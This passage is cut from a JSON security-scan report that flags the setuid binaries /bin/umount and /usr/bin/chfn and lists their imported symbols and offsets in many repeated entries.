                  "details": "Offset: 0x00012060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c60, Symbol: mnt_table_set_parser_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c68, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c70, Symbol: mnt_context_is_restricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c78, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c80, Symbol: mnt_unref_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c88, Symbol: mnt_context_next_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c90, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008c98, Symbol: mnt_context_helper_executed, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ca0, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ca8, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cb0, Symbol: secure_getenv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cb8, Symbol: mnt_context_enable_fake, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cc0, Symbol: warn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cc8, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cd0, Symbol: mnt_context_switch_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cd8, Symbol: mnt_table_next_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ce0, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ce8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cf0, Symbol: mnt_new_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008cf8, Symbol: mnt_context_get_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d00, Symbol: mnt_context_disable_swapmatch, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d08, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d10, Symbol: mnt_context_find_umount_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d18, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d20, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d28, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d30, Symbol: mnt_get_library_features, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d38, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d40, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d48, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d50, Symbol: errx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d58, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d60, Symbol: warnx, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d68, Symbol: mnt_context_force_unrestricted, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d70, Symbol: mnt_context_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d78, Symbol: nanosleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d80, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d88, Symbol: mnt_new_table, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d90, Symbol: dup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008d98, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008da0, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008da8, Symbol: mnt_context_disable_helpers, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008db0, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008db8, Symbol: getcwd, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dc0, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dc8, Symbol: mnt_context_set_tables_errcb, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dd0, Symbol: pipe, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008dd8, Symbol: mnt_new_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008de0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008de8, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008df0, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008df8, Symbol: mnt_fs_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e00, Symbol: mnt_context_switch_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e08, Symbol: mnt_fs_get_srcpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e10, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e18, Symbol: memcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e20, Symbol: mnt_context_enable_loopdel, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e28, Symbol: mnt_context_tab_applied, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e30, Symbol: prctl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e38, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e40, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e48, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e50, Symbol: mnt_init_debug, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e58, Symbol: mnt_context_syscall_called, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e60, Symbol: err, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e68, Symbol: mnt_context_set_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e80, Symbol: mnt_context_get_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e88, Symbol: mnt_context_get_excode, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e90, Symbol: mnt_free_iter, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008e98, Symbol: mnt_context_is_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ea0, Symbol: mnt_context_set_target_ns, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ea8, Symbol: getegid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008eb0, Symbol: mnt_table_set_cache, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008eb8, Symbol: mnt_context_enable_lazy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ec0, Symbol: mnt_table_find_target, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ec8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ed0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ed8, Symbol: mnt_context_enable_force, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ee0, Symbol: mnt_fs_get_devno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ee8, Symbol: mnt_context_get_source, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ef0, Symbol: mnt_get_library_version, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ef8, Symbol: mnt_reset_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f00, Symbol: memmove, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f08, Symbol: setgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f18, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f20, Symbol: mnt_context_enable_rdonly_umount, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f28, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f30, Symbol: mnt_context_set_options_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f38, Symbol: mnt_free_context, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f40, Symbol: mnt_context_disable_canonicalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f48, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f50, Symbol: mnt_context_set_fstype_pattern, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f58, Symbol: __cxa_atexit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f60, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f68, Symbol: fwrite, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f70, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f78, Symbol: mnt_context_enable_verbose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f80, Symbol: mnt_table_next_child_fs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f88, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f90, Symbol: mnt_context_disable_mtab, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008f98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fa0, Symbol: mnt_table_parse_file, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fa8, Symbol: mnt_tag_is_valid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fb0, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fb8, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fc0, Symbol: mnt_context_get_status, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fc8, Symbol: mnt_context_get_syscall_errno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fd0, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fd8, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fe0, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008fe8, Symbol: environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00008ff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009020, Symbol: __progname, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009028, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009030, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009040, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/bin/umount",
                  "details": "Offset: 0x00009060, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x000032d0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x00003370, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc38, Symbol: __strcat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc40, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc48, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc50, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc58, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc60, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc68, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc70, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc78, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc80, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc88, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc90, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dc98, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dca0, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dca8, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcb0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcb8, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcc0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcc8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcd0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcd8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dce0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dce8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcf0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dcf8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd00, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd08, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd10, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd18, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd20, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd28, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd30, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd38, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd40, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd48, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd50, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd58, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd60, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd68, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd70, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd78, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd80, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd88, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd90, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dd98, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dda0, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dda8, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddb0, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddb8, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddc0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddc8, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddd0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddd8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dde0, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dde8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddf0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ddf8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de00, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de08, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de10, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de18, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de20, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de28, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de30, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de38, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de40, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de48, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de50, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de58, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de60, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de68, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de80, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de88, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de90, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000de98, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dea0, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dea8, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000deb0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000deb8, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dec0, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dec8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ded0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ded8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
